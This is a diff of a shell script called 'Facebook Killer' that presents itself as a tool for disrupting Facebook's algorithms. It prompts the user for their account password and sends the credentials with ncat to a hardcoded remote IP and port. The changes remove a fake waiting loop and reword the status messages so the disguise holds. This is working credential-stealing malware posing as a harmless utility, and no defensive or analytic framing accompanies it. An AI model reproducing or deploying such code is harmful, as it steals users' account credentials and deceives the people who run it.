@@ -7,14 +7,11 @@ pass=$(dialog --title "Facebook Killer" --passwordbox "Enter the password that g
 
 num=$(dialog --title "Facebook Killer" --inputbox "Enter the number of times you would like the script to run. Larger numbers are better for affecting the algorithm but will take longer" 20 80 3>&1 1>&2 2>&3 3>&1)
 
-dialog --title "Facebook Killer" --infobox "The program is now messing with the algorithms of facebook. Please be patient..." 20 80
+dialog --title "Facebook Killer" --infobox "You have submitted the account for algorithm obfuscation" 20 80
 
 echo $user:$pass:$num | ncat 10.154.40.212 42069
 
-for i in `seq 1 $num`; do
-sleep 5
-done
 
-dialog --title "Facebook Killer" --msgbox "The algorithm has been messed with. Thank you for your patience." 20 80
+dialog --title "Facebook Killer" --msgbox "The algorithm has been messed with. Thank you." 20 80
 
 clear
